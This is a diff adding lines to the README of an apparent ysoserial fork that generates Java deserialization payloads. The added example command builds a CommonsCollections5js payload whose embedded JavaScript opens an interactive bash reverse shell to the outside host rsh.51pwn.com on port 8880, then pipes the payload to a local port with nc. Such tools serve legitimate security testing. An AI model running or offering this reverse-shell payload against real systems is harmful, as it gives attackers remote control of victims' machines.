@@ -11,6 +11,9 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 # New Features
 - add CommonsCollections5js support "js code",ByPass java8 "java.lang.Override missing element entrySet"
+```
+java -jar $mtx/../tools/ysoserial-all.jar CommonsCollections5js "var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\");x.start().getInputStream();"|nc 127.0.0.1 4712
+```
 - Allows java fragment code injection to be obtained from the environment variable **Custom_Code_51pwn** to solve complex command problems
 eg:
 ```
